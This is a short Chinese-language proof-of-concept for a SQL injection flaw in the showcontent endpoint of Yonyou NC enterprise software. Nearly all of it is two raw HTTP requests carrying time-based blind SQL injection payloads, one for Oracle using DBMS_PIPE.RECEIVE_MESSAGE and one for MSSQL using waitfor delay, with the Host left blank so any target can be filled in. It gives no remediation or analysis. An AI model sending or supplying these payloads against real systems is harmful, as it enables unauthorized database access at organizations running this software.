## 用友NC-showcontent接口存在sql注入漏洞


## poc
```
orale:
GET /ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20'Mgtn'='Mgtn HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: identity
Connection: close
Content-Type: text/xml; charset=utf-8
SL-CE-SUID: 31



mssql:
GET /ebvp/infopub/showcontent?id=1'%20waitfor%20delay%20'0:0:6
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

```
